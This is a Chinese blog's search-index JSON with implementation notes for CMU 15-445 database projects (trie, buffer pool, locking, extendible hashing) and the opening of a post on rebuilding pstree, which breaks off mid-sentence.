[{"categories":["CMU15445(2023-fall)"],"content":"摘要：CMU 15445 Project 3 的实现笔记和优化攻略.","date":"2024-03-10","objectID":"/cmu-15445-project3/","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project3","uri":"/cmu-15445-project3/"},{"categories":["CMU15445(2023-fall)"],"content":"Foreword 过完年摆着摆着就开学了, 再不努力加进度就寄了. 照例先放 Leader-Board, 截止 2024/02/28 排名第 2: (其中 Q1 和 Q3 都是单榜第一) figure-1 LeaderBoard 在这一章我们从存储器和索引继续往上走, 进入了 SQL 的执行和优化环节. 建议反复看下面这张图理解整个流程: figure-2 ProjectStructure ","date":"2024-03-10","objectID":"/cmu-15445-project3/:1:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project3","uri":"/cmu-15445-project3/"},{"categories":["CMU15445(2023-fall)"],"content":"Task #1 - Access Method Executors ","date":"2024-03-10","objectID":"/cmu-15445-project3/:2:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project3","uri":"/cmu-15445-project3/"},{"categories":["CMU15445(2023-fall)"],"content":"Task #2 - Aggregation \u0026 Join Executors ","date":"2024-03-10","objectID":"/cmu-15445-project3/:3:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project3","uri":"/cmu-15445-project3/"},{"categories":["CMU15445(2023-fall)"],"content":"Task #3 - HashJoin Executor and Optimization ","date":"2024-03-10","objectID":"/cmu-15445-project3/:4:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project3","uri":"/cmu-15445-project3/"},{"categories":["CMU15445(2023-fall)"],"content":"Task #4: Sort + Limit Executors + Window Functions + Top-N Optimization ","date":"2024-03-10","objectID":"/cmu-15445-project3/:5:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project3","uri":"/cmu-15445-project3/"},{"categories":["CMU15445(2023-fall)"],"content":"Leaderboard Optimization ","date":"2024-03-10","objectID":"/cmu-15445-project3/:6:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project3","uri":"/cmu-15445-project3/"},{"categories":["CMU15445(2023-fall)"],"content":"Q1 ","date":"2024-03-10","objectID":"/cmu-15445-project3/:6:1","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project3","uri":"/cmu-15445-project3/"},{"categories":["CMU15445(2023-fall)"],"content":"Q2 ","date":"2024-03-10","objectID":"/cmu-15445-project3/:6:2","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project3","uri":"/cmu-15445-project3/"},{"categories":["CMU15445(2023-fall)"],"content":"Q3 ","date":"2024-03-10","objectID":"/cmu-15445-project3/:6:3","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project3","uri":"/cmu-15445-project3/"},{"categories":["CMU15445(2023-fall)"],"content":"Conclusion","date":"2024-03-10","objectID":"/cmu-15445-project3/:7:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project3","uri":"/cmu-15445-project3/"},{"categories":["CMU15445(2023-fall)"],"content":"摘要：CMU 15445 Project 2 的实现笔记和优化攻略.","date":"2024-02-05","objectID":"/cmu-15445-project-2/","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 2","uri":"/cmu-15445-project-2/"},{"categories":["CMU15445(2023-fall)"],"content":"Foreword 这两天从清水河)臭水河的 526 回到了连个服务器都得试 N 次的老家, 感觉进度又慢了不少. 先放 LeaderBoard 结果吧, 截止 2024/02/05 排名第 3: figure-1 LeaderBoard ","date":"2024-02-05","objectID":"/cmu-15445-project-2/:1:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 2","uri":"/cmu-15445-project-2/"},{"categories":["CMU15445(2023-fall)"],"content":"Task #1 - Read/Write Page Guards 实现对 page 的 RAII 保护, 实现还是蛮简单的. 主要是有几个坑点: 因为要同时保留手动传入和手动释放的接口, 所以锁的获取和保留并不是在构造和析构时完成的. 而是传入指针前获取, 析构时调用 Drop 释放. 注意对指针相同和为空的特殊判断. ","date":"2024-02-05","objectID":"/cmu-15445-project-2/:2:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 2","uri":"/cmu-15445-project-2/"},{"categories":["CMU15445(2023-fall)"],"content":"Task #2 - Extendible Hash Table Pages 这几个按照注释翻译即可, 只讲下遇到的坑点了. ","date":"2024-02-05","objectID":"/cmu-15445-project-2/:3:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 2","uri":"/cmu-15445-project-2/"},{"categories":["CMU15445(2023-fall)"],"content":"header header 表用于对 hash 的 MSB 进行索引, 定位到对应的 directory. 其采用静态的结构是便于对并发的控制. 首先解决一个函数签名的格式问题: - auto GetDirectoryPageId(uint32_t directory_idx) const -\u003e uint32_t; + auto GetDirectoryPageId(uint32_t directory_idx) const -\u003e page_id_t; 以及获取 MSB 时如果 max_depth_ 为 0, uint32_t » 32 是 ub 行为 (在 clang 中会返回自身而非 0). 所以还需要进行一次特判. hash \u003e\u003e (HTABLE_HEADER_PAGE_METADATA_SIZE * 8 - max_depth_); ","date":"2024-02-05","objectID":"/cmu-15445-project-2/:3:1","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 2","uri":"/cmu-15445-project-2/"},{"categories":["CMU15445(2023-fall)"],"content":"directory directory 中 global_depth_, local_depth_ 的设计是整个 extendiblehash 的精髓. 通过这两个变量的设计, 可以实现动态的扩容和收缩. global_depth_ 变化时记得对 bucket 进行复制或初始化操作. ","date":"2024-02-05","objectID":"/cmu-15445-project-2/:3:2","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 2","uri":"/cmu-15445-project-2/"},{"categories":["CMU15445(2023-fall)"],"content":"bucket bucket 只作为存储和查找的容器, 实现比较简单. 只需要注意每个元素是唯一的, 插入前需要进行检查. ","date":"2024-02-05","objectID":"/cmu-15445-project-2/:3:3","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 2","uri":"/cmu-15445-project-2/"},{"categories":["CMU15445(2023-fall)"],"content":"Task #3 - Extendible Hashing Implementation GetValue 和 不特殊处理的 Insert, Remove 都是直接调用对应的 page 的函数即可. 下面主要讲一下特殊处理的步骤. ","date":"2024-02-05","objectID":"/cmu-15445-project-2/:4:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 2","uri":"/cmu-15445-project-2/"},{"categories":["CMU15445(2023-fall)"],"content":"Insert 当 Insert 时如果只因为 bucket 满了而需要分裂时, 需要进行以下步骤: 如果 local_depth_ \u003c global_depth_, 若否转 7. 初始化分裂出的 bucket local_depth_ + 1 重新分配 directory, 将 msb 取反对应的 bucket_idx 指向新的 bucket. 对原来 bucket 中的所有 key 用新的 local_depth_ 重新分配到两个 bucket 中. 尝试插入 key. 成功则返回, 否则转 1. 如果 global_depth_ \u003c max_depth_, 则进行全局分裂. 成功转 1; 否则返回失败. ","date":"2024-02-05","objectID":"/cmu-15445-project-2/:4:1","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 2","uri":"/cmu-15445-project-2/"},{"categories":["CMU15445(2023-fall)"],"content":"Remove 当 remove 后如果 bucket 为空而可能需要合并时, 需要进行以下步骤: 首先检查 global_depth_ 是否为 0, 即不存在 merge_bucket. 将该 bucket 设置为 INVALID_PAGE_ID 后删除即可返回. 开始循环, 如果 bucket 和 merge_buckt 页面不同且 local_depth 相同, 则进行合并操作. 遍历 directory, 将指向 bucket 的指针指向 merge_bucket, 减少 local_depth_. 删除 bucket. 检查是否可以收缩 global_depth_ a) 是: 收缩. 遍历 directory, 检查是否仍然有为空的 bucket, 有则以其为收缩点转 2. b) 否: 检查 merge_bucket 是否为空, 是则转2. 如果还是失败的话可以用 LOG_DEBUG 来输出一些信息, 方便调试. 同时可以试试下面的测试用例: TEST(ExtendibleHTableTest, DebugTest) { auto disk_mgr = std::make_unique\u003cDiskManagerUnlimitedMemory\u003e(); auto bpm = std::make_unique\u003cBufferPoolManager\u003e(3, disk_mgr.get()); DiskExtendibleHashTable\u003cint, int, IntComparator\u003e ht(\"debug_test\", bpm.get(), IntComparator(), HashFunction\u003cint\u003e(), 9, 9, 255); for (int i = 1; i \u003c= 5; i++) { ht.Insert(i, i); } std::vector\u003cint\u003e remove_order{1, 1, 5, 5, 3, 4}; for (auto i : remove_order) { ht.Remove(i); } ht.VerifyIntegrity(); } 这里简短地说一下并发的实现吧, 由于已经使用了 page_guard, 所以只需要保证 insert 和 remove 两个事务操作不对同一块操作打断就行. 目前看下来效果来看, 直接一把大锁反而是效果最好的, 如果细化 directory 的锁, 会提升 write 性能, 但是频繁地锁操作反而导致 read 性能大幅下降. 所以最终还是选择了大锁. 事务区别 Transaction *transaction 并没有用上, 以后有空再补上这一块吧. ","date":"2024-02-05","objectID":"/cmu-15445-project-2/:4:2","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 2","uri":"/cmu-15445-project-2/"},{"categories":["CMU15445(2023-fall)"],"content":"Conclusion 后面看了之前 2023-Spring 的实验, 从 B+ 树到 Extendible Hashing 的难度确实下降了不少. 这次 lab 最大的收获就是调试技术的提升, 尤其是对于不太方便内存挨个查看的过程. 然后便是对 LOG_DEBUG 的应用, 可以方便地帮我复现短过程的 gradescope 测试失败样例. ","date":"2024-02-05","objectID":"/cmu-15445-project-2/:5:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 2","uri":"/cmu-15445-project-2/"},{"categories":["CMU15445(2023-fall)"],"content":"摘要：CMU 15445 Project 1 的实现笔记和优化攻略.","date":"2024-01-27","objectID":"/cmu-15445-project-1/","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 1","uri":"/cmu-15445-project-1/"},{"categories":["CMU15445(2023-fall)"],"content":"Foreword 从 Project-0 到 Project-1 中间摆了好几天. 出完分发现保外有点希望又开始白兰地了. 环境配置上彻底换成了 CMake-tools 和 clang-14, 中间配置时遇到了一些问题, 例如找不到 dwarf_producer_init_c 导致编译直接失败的问题. 后面发现是因为使用了 ninja, 不支持或者过于严格冲突了, 后面将设置改为 Unix Makefiles 之后就好了. \"cmake.generator\": \"Unix Makefiles\", 然后先说优化结果, LeaderBoard 排名第 8 (2024/01/26), 优化结果如下: figure-1 LeaderBoard 给前面几位神仙磕一个 orz, 不过我有合理理由怀疑前面也有 hack 的. 有的数据还是太吓人了. 这个 LeaderBoard 是有漏洞可以绕过的, 如果 just hack for fun, 可以直接刷榜到第一. 当然如果这样已经失去其原本的意义了. 所以截个图图一乐, 后面还是 active 正常的优化方式得到的结果了. figure-2 hack_for_fun 基于课程要求, 本文并不包含代码实现, 也不会公开仓库. 不过欢迎读者找我交流. lx10ng@qq.com ","date":"2024-01-27","objectID":"/cmu-15445-project-1/:1:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 1","uri":"/cmu-15445-project-1/"},{"categories":["CMU15445(2023-fall)"],"content":"Task #1 - LRU-K Replacement Policy ","date":"2024-01-27","objectID":"/cmu-15445-project-1/:2:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 1","uri":"/cmu-15445-project-1/"},{"categories":["CMU15445(2023-fall)"],"content":"RecordAccess 使用两个队列分别记录以 K 频次划分的访问记录. 每次访问时, 结点记录当前的时间序列, history_count_ 加一. 然后分别处理: 如果小于 K, 那么不作更改, 因为小于 K 频次时 FIFO. 如果等于 K, 那么将结点从 history_list_ 中移动到 lru_list_ 中. 如果大于 K, 那么逐出结点记录的最早访问记录, 然后再将该结点在 lru_list_ 中按照时间序列插入到合适的位置. ","date":"2024-01-27","objectID":"/cmu-15445-project-1/:2:1","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 1","uri":"/cmu-15445-project-1/"},{"categories":["CMU15445(2023-fall)"],"content":"Evict 按序遍历两个队列, 逐出第一个可驱逐的结点即可. 后面几个函数按照要求写差不多等于翻译了. 这里的并行比较简单, 直接一把大锁给每个函数锁住就行. 主要瓶颈也不在这里, 所以后面也没有对这里做什么优化. ","date":"2024-01-27","objectID":"/cmu-15445-project-1/:2:2","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 1","uri":"/cmu-15445-project-1/"},{"categories":["CMU15445(2023-fall)"],"content":"Task #2 - Disk Scheduler 这一部分是 2023-fall 新加的实现, 为后面的优化作了很大的提示和准备了. 就是将 IO 操作独立出去, 通过独立的工作线程不断地从任务队列中取出任务并执行. 完成后设置回调, 这样可以将 IO 操作和计算操作分离, 从而提高 CPU 的利用率. 用空任务来结束线程的循环, 实现析构. 同时这一部分是不需要加锁的, 因为取任务的函数已经做到线程安全了, 对同一个页面的 IO 操作的锁通过后面的 BufferPoolManager 来实现. ","date":"2024-01-27","objectID":"/cmu-15445-project-1/:3:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 1","uri":"/cmu-15445-project-1/"},{"categories":["CMU15445(2023-fall)"],"content":"Task #3 - Buffer Pool Manager 好, 现在到 Project 1 的核心部分了. Buffer Pool 需要管理内存和磁盘的页面交换实现类似于虚拟内存的功能. ","date":"2024-01-27","objectID":"/cmu-15445-project-1/:4:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 1","uri":"/cmu-15445-project-1/"},{"categories":["CMU15445(2023-fall)"],"content":"NewPage 调用时先从 free_list_ 查看有无空闲的 frame. 如果没有再检查 lruk, 置换出一个页面. 如果置换成功修改对应的元数据. ","date":"2024-01-27","objectID":"/cmu-15445-project-1/:4:1","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 1","uri":"/cmu-15445-project-1/"},{"categories":["CMU15445(2023-fall)"],"content":"FetchPage 先检查 page_table 查看该页是否在内存中, 是则直接返回. 否则需要一个空闲页框, 获取方法同上, 然后修改元数据, 将数据从磁盘读回内存. ","date":"2024-01-27","objectID":"/cmu-15445-project-1/:4:2","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 1","uri":"/cmu-15445-project-1/"},{"categories":["CMU15445(2023-fall)"],"content":"UnpinPage 对页面操作时会对页面 PIN 住, 用于防止操作时被换出. 操作结束后需要 Unpin 解锁, 同时记录本次操作有无改变页面内容, 因此需要对 is_dirty 进行 |= 操作. ","date":"2024-01-27","objectID":"/cmu-15445-project-1/:4:3","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 1","uri":"/cmu-15445-project-1/"},{"categories":["CMU15445(2023-fall)"],"content":"FlushPage/FlushAllPages 对 Page 进行检查是否为脏页面, 执行写回操作. ","date":"2024-01-27","objectID":"/cmu-15445-project-1/:4:4","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 1","uri":"/cmu-15445-project-1/"},{"categories":["CMU15445(2023-fall)"],"content":"DeletePage 就检查然后执行元数据清除操作, 最后将删除后空出来的页框加入到 free_list_. ","date":"2024-01-27","objectID":"/cmu-15445-project-1/:4:5","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 1","uri":"/cmu-15445-project-1/"},{"categories":["CMU15445(2023-fall)"],"content":"AllocatePage 需要加一个针对该元数据的锁, 用于保持并发和互斥. ","date":"2024-01-27","objectID":"/cmu-15445-project-1/:4:6","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 1","uri":"/cmu-15445-project-1/"},{"categories":["CMU15445(2023-fall)"],"content":"Leaderboard Task 引用\rDoing Project without the LeaderBoard is equivalent to playing games without Genshin Impact.\r","date":"2024-01-27","objectID":"/cmu-15445-project-1/:5:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 1","uri":"/cmu-15445-project-1/"},{"categories":["CMU15445(2023-fall)"],"content":"Two-phase locking 最有趣的部分来了.首先我们目前已经拿到了初始的 100 分, 但是还是完全串行的操作, 整个 buffer pool 通过一把大锁来控制并发, 导致大部分 CPU 完全浪费在锁的等待上. 我们完全可以细化锁的粒度, 来实现不同页面并行操作, 只在对于公共数据, 例如 page_table_ free_list_ 时通过锁来互斥. 由于我们已经将 IO 操作独立线程处理了, 所以显然, 目前瓶颈在于一个页面处理 IO 时, 其余页面被共有的大锁锁住了.所以目前主要任务是将 buffer pool 的各个函数对不同的 page_id_ 能够实现并行. 那么我们便需要以下几个锁 std::mutex next_page_id_mutex_; std::mutex free_list_mutex_; std::shared_mutex page_table_mutex_; std::vector\u003cstd::mutex\u003e page_mutexes_; 但是初步加锁时, 我想当然地使用类似这样的锁最小粒度地包括了各个元数据操作. 结果可想而知, 自然不是死锁就是不一致性问题. std::unique_lock\u003cstd::mutex\u003e guard_free_list(free_list_mutex_); { // } 在这里卡了许久之后, 我才明白我可能缺少对锁的认识. 捡起大二上的数据库课本看了眼, 才发现『两段锁协议』这个名词.(考完试就忘, 大学生是这样的) 引用\rBy the 2PL protocol, locks are applied and removed in two phases: Expanding phase: locks are acquired and no locks are released. Shrinking phase: locks are released and no locks are acquired. 有了这个理论加持, 锁的安排就方便多了. 我们首先对每一个函数列出需要的锁, 指定需求获取顺序, 由于两段锁的释放必须在所有锁获取之后, 因此所有锁的获取顺序必须确定, 否则可能导致死锁. 在我的实现中,顺序是: free_list_mutext_ -\u003e page_table_mutex_ -\u003e page_mutexts[page_id] 那么有了两段锁协议导致锁的获取提前了, 那效率不是降低了很多吗? 别急, 基于这个方式的锁的获取下, 我们还可以做的优化还有很多. 首先对于 page_table_ 我们并非所有的操作都是互斥的, 因此我们可以引入读写锁, 在开头查询是否该页是否在内存时只需要获取 shared_lock 即可, 后面需要更改时, 再在受保护的情况下对锁进行升级. 这样可以大幅度提高访问内存中页面的并发性. 虽然 c++ 并没有提供标准的锁的升级, 导致这里看起来是不安全的, 但是需要对 page_table_ 先读再写的操作的函数只有一个 FetchPage.而在这个函数中, 我们又需要对 free_list_ 进行操作, 尽管操作在最后, 我们还是为了保持锁的顺序性将其提前到最先获取. 那么这种情况下, 我们读写锁的升级就是在 free_list_mutex_ 的保护下进行的了. 说了这么多不还是要先获取一个锁来保护吗? 那不是相当于没优化? 别急, 虽然锁的获取上我们可做的工作不多了, 但是我们可以调整后面临界区的操作, 使得锁的释放操作提前. 还是拿 FetchPage 举例子, 我们可以在拿到 guard_page 也就是最后一个锁之后, 先进行另外两个锁的临界操作, 将他们提前释放, 然后再进行较为耗时的磁盘 IO 等待, 从而提高并行效率. 所以整体地思想就是, 先按照两段锁协议对锁进行排序, 实现线程安全地操作. 然后在有锁保护的情况下可以加入读写锁的升级. 最后对各个临界操作进行前后的调整, 使得最后一个锁的获取和其余锁的释放尽量提前, 将耗时操作后移. 按照这个思路, 到目前为止, 前四项无延迟的 qps 基本可以达到接近 4w, 已经可以杀到前四项十名左右了. 这里大致是优化完了, 但是为什么 qps_1ms 的数字还是只有两三百呢? ","date":"2024-01-27","objectID":"/cmu-15445-project-1/:5:1","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 1","uri":"/cmu-15445-project-1/"},{"categories":["CMU15445(2023-fall)"],"content":"Mutiple Disk thread 我们使用 perf 查看一下究竟卡在了什么地方 cmake .. -DCMAKE_BUILD_TYPE=RelWithDebInfo make -j`nproc` bpm-bench sudo perf record -g ./bin/bustub-bpm-bench --duration 5000 --latency 1 sudo perf script -i perf.data \u003e profile.linux-perf.txt 将 profile.linux-perf.txt 用 speedscope 打开. figure-3 speedscope1 可以发现, 主要的时间占用是被 disk_manage_ 给占据住了, 只有一个线程在后台处理任务是跟不上速度的, 于是我们决定多加几个 WorkThreads. 在添加了磁盘线程之后, 我们可以看到, 原本的瓶颈已经大致解决了. (不过肉眼可见地还有很多可以优化的地方 figure-4 speedscope2 注意\r这里值得注意的是, 最好不要对每一个任务新建线程去执行. 虽然任务的效率拉满了, 但是线程的建立析构和切换消耗的 CPU 时间同样是巨量的.\r因此我们采用线程池的方式, 建立若干个工作线程, 检测到任务时分派给他们, 从而实现线程消耗和任务等待的平衡.至于后台线程数量什么时候最佳, 如何处理多个线程的析构问题, 就交给读者自行处理啦. 最后欣赏一下理论上的调用图的优雅吧 (just hack for fun) figure-5 speedscope3 ","date":"2024-01-27","objectID":"/cmu-15445-project-1/:5:2","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 1","uri":"/cmu-15445-project-1/"},{"categories":["CMU15445(2023-fall)"],"content":"Potentially useful but unimplemented ideas 对于没有磁盘延时和有延时的任务来说, 所需要的后台 WorkThreads 数量是不同的, 同时对于同一个场景下, IO数量的任务也可能随着时间变化, 可能一会是 CPU 密集型, 一会是 IO 密集型. 对于这种情况, 固定容量的线程池就无法较好地胜任了, 我们需要新加入一个线程用于检测 request_queue_ 和 workingthread 的相对程度, 来动态调节线程池的容量, 使用类似于已经学过的 TCP 控制流量的方式来间接控制. LRU-K 的实现效率还较低, 复杂度最差为 $\\text{O}(n)$, 理论上可以通过引入树型结构达到 $\\text{O}(\\log{n})$. 同时这里也还是一把大锁, 可以做适当的并行优化. 我的实现中并未对于 AccessType 进行特别处理, 理论上 Scan 线程实际上是污染了 LookUp 线程的访问频次的. 不过由于已经在这个 Project 上花费了太多的时间, 先接着推整个 Project 的进度了, 以上的有空再修改吧. 相信后人的智慧 ","date":"2024-01-27","objectID":"/cmu-15445-project-1/:5:3","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 1","uri":"/cmu-15445-project-1/"},{"categories":["CMU15445(2023-fall)"],"content":"Conclusion 非常有趣的一次实验, 从初步接触 modern c++17 的懵懂, 到后面通过已学知识对并发不断地优化刷榜, 整个过程可太有收获了. 该部分并行优化实现时参考了一部分散落的叶子大佬的思路 CMU 15-445 2023 P1 优化攻略. ","date":"2024-01-27","objectID":"/cmu-15445-project-1/:6:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 1","uri":"/cmu-15445-project-1/"},{"categories":["CMU15445(2023-fall)"],"content":"摘要：CMU 15445 Project 0 的实现笔记以及一些坑点.","date":"2024-01-14","objectID":"/cmu-15445-project-0/","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 0","uri":"/cmu-15445-project-0/"},{"categories":["CMU15445(2023-fall)"],"content":"前言 寒假无所事事决定刷一下 CMU 15445 的 Project, 顺便学习一下 C++. 结果我 Project 0 就写得汗流浃背的, 直接打破了我对 C++ 的幻想. 顺便批评一下 UESTC 的 C++ 教学, 2 个学分只教了个面向对象, modern Cpp 的内容一点没有. 第一次写的时候, 智能指针看得我头大. 噫！『 上课耽误学习 』 诚不欺我。 基于课程要求, 本文并不包含代码实现, 也不会公开仓库. 不过欢迎读者找我交流. lx10ng@qq.com ","date":"2024-01-14","objectID":"/cmu-15445-project-0/:1:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 0","uri":"/cmu-15445-project-0/"},{"categories":["CMU15445(2023-fall)"],"content":"环境配置 直接跟着 README.md 的步骤来就行了, 网上类似的教程也挺多, 不多说了. 我的环境是 VSCode 远程连接 Ubuntu 22.04, Clang++-18, clangd. 官方推荐是 Clang++14, 亲测除了会在 cmake 时有一句 warning 之外并无影响, 所以也就懒得改了. ","date":"2024-01-14","objectID":"/cmu-15445-project-0/:2:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 0","uri":"/cmu-15445-project-0/"},{"categories":["CMU15445(2023-fall)"],"content":"Task #1 - Copy-On-Write Trie 实现一个写时复制的前缀树 (COW Trie), 用于存储键值对和版本管理. 包括实现三个函数 Get, Put 和 Remove. ","date":"2024-01-14","objectID":"/cmu-15445-project-0/:3:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 0","uri":"/cmu-15445-project-0/"},{"categories":["CMU15445(2023-fall)"],"content":"Get 沿着深度向下寻找便是, 找不到或者根结点为空就返回 nullptr. 找到结点之后来到了 C++ 喜闻乐见的类型转换, 我们需要对这个基类的智能指针强制转换. auto ret = dynamic_cast\u003cconst TrieNodeWithValue\u003cT\u003e *\u003e(terminal_node.get()); 然后进行对 ret 进行空判断来推出 terminal_node 是父类还是子类, 如果是父类那么是错误查询返回空指针. 坑点\r对根结点为空的判断错误在这个 Get 的测试中是看不出来的, 要在后面 Put 的调试中才能发现.\r","date":"2024-01-14","objectID":"/cmu-15445-project-0/:3:1","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 0","uri":"/cmu-15445-project-0/"},{"categories":["CMU15445(2023-fall)"],"content":"Put 整个 Project 0 中最难的一部分, 难点在于对 Copy-On-Write 的理解, 以及对智能指针和 std::move 的利用. 整个流程大致如下: 沿着路径向下寻找, 一边寻找一边复制路径结点直到到底或者 key 末尾时转 2 或 3; 如果找完路径有剩, 说明剩下的结点都需要自己新建; 如果找到已有的路径, 那么对 terminal_node 进行类型检验, 分别进行 clone\u0026polish / new 的操作; 最后返回 new_root 的 trie tree. 坑点\r初始时需要检验 root_ 是否为空进行不同的初始化操作. T value 的使用需要 std::make_shared\u003cT\u003e(std::move(value)) 但是只能使用一次, 所以需要新建一个局部变量 new_value 之后使用这个传入参数, 不然过不了 clang-tidy 的检查. ","date":"2024-01-14","objectID":"/cmu-15445-project-0/:3:2","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 0","uri":"/cmu-15445-project-0/"},{"categories":["CMU15445(2023-fall)"],"content":"Remove 写完 Put 之后这个的实现就相对简单了, 对于能找到的路径的 terminal_node 修改为 TrieNode, 然后自底向上检查. 同时满足没有孩子和不是带值结点就删除, 否则停止. 最后对根结点做一次检验, 如果是空结点那么返回空树. 坑点\r同样需要特殊处理 root_, 有为空和直接删除带值根结点两种情况. 函数已经指定了返回类型, 所以返回空树时应当写 return {}; 而不是 return Trie();. 这个也是 clang-tidy 要求. ","date":"2024-01-14","objectID":"/cmu-15445-project-0/:3:3","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 0","uri":"/cmu-15445-project-0/"},{"categories":["CMU15445(2023-fall)"],"content":"Task #2 - Concurrent Key-Value Store 对 Task1 中的实现进行并行化, 使得可以同时有多个读者和一个写者同时访问Trie. 学过操作系统的互斥和同步之后这个就很简单了, 注意临界区加锁就行, 不再赘述. ","date":"2024-01-14","objectID":"/cmu-15445-project-0/:4:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 0","uri":"/cmu-15445-project-0/"},{"categories":["CMU15445(2023-fall)"],"content":"Task #3 - Debugging 这个 Task 主要是要求对 gdb 的掌握, 打断点查看内存信息, 因为涉及到动态指针, 所以只靠默认 Debugger 是无法满足要求的. 我一开始找到内存后直接强制转换指针访问, 但是死活访问不上 (gdb) p *(TrieNodeWithValue\u003cuint32_t\u003e*)0x608000001130 No symbol \"TrieNodeWithValue\u003cuint32_t\u003e\" in current context. 无奈之下为了做出这个 Task, 我在前面的 40 行设置条件断点 key.compare(\"969\")==0 可以绕过后面的智能指针得到答案.( 不提倡 ) 但是这终究不是正解, 后面我在求助 ssg 和 crescentia 之后在 gdb 命令行中又重试了一遍, 发现 (gdb) p *(TrieNode*)0x608000001130 $1 = {_vptr.TrieNode = 0x5555557ce700 \u003cvtable for bustub::TrieNodeWithValue\u003cunsigned int\u003e+16\u003e, children_ = std::map with 0 elements, is_value_node_ = true} 原因竟是 uint32_t 会被宏替换为 unsigned int, 所以 gdb 中自然没有 TrieNodeWithValue\u003cuint32_t\u003e 这个类型. 可恶, 好坑! ","date":"2024-01-14","objectID":"/cmu-15445-project-0/:5:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 0","uri":"/cmu-15445-project-0/"},{"categories":["CMU15445(2023-fall)"],"content":"Task #4 - SQL String Functions 这个 Task 就是对 SQL 字符串的文本处理了, 实现设计到 std::transform 的使用和函数的注册. ","date":"2024-01-14","objectID":"/cmu-15445-project-0/:6:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 0","uri":"/cmu-15445-project-0/"},{"categories":["CMU15445(2023-fall)"],"content":"项目提交的坑点 记得先运行 gradescope_sign.py 添加签名. 注意代码格式问题, 我一开始不注重 clang-tidy 导致后面改了半天. ","date":"2024-01-14","objectID":"/cmu-15445-project-0/:7:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 0","uri":"/cmu-15445-project-0/"},{"categories":["CMU15445(2023-fall)"],"content":"总结 通过这次一天多的 Project 0, 使我第一次面对 modern cpp 的高级特性. 这就是 c++! 太难蚌了. ","date":"2024-01-14","objectID":"/cmu-15445-project-0/:8:0","tags":["Project","CMU15445","Database"],"title":"CMU 15445 Project 0","uri":"/cmu-15445-project-0/"},{"categories":["build_your_own"],"content":"摘要：这是 build_your_own 系列的第一篇, 从实现一个简单的 pstree 开始","date":"2023-09-18","objectID":"/build_your_own_pstree/","tags":["build_your_own","pstree"],"title":"Build_your_own_pstree","uri":"/build_your_own_pstree/"},{"categories":["build_your_own"],"content":"1. 前言 学了这么久的计算机, 却没有什么实际产出. 并且不是很愿意搞开发, 正好这学期上操作系统课, 于是就有了 build_your_own 系列的想法. 又恰好, 在早八的马原课由于二进制的随机排列组合, 我写下了 pstree. 于是这个系列我们从 pstree 开始. ","date":"2023-09-18","objectID":"/build_your_own_pstree/:1:0","tags":["build_your_own","pstree"],"title":"Build_your_own_pstree","uri":"/build_your_own_pstree/"},{"categories":["build_your_own"],"content":"2. pstree pstree 是一个 Linux 下的命令行工具, 用于显示进程树. 完整的 pstree 功能还是很多的, 我这里选择了简单的 -p 参数版本实现. \u003e pstree -p\r显示进程树, 并显示进程的 PID.\rfigure-1 pstree_in_kernel ","date":"2023-09-18","objectID":"/build_your_own_pstree/:2:0","tags":["build_your_own","pstree"],"title":"Build_your_own_pstree","uri":"/build_your_own_pstree/"},{"categories":["build_your_own"],"content":"3. 实现 ","date":"2023-09-18","objectID":"/build_your_own_pstree/:3:0","tags":["build_your_own","pstree"],"title":"Build_your_own_pstree","uri":"/build_your_own_pstree/"},{"categories":["build_your_own"],"content":"3.1. 结构体定义 首先我们要定义一个进程树的结构体, 用于存储进程的信息. 我采用的是链表的形式存储进程树, 一个进程的子进程通过 child 指针指向, 兄弟进程通过 next 指针指向. typedef struct node { __pid_t pid; char *name; __pid_t ppid; struct node *next; struct node *child; } node; 然后整个进程树通过一个数组存储, 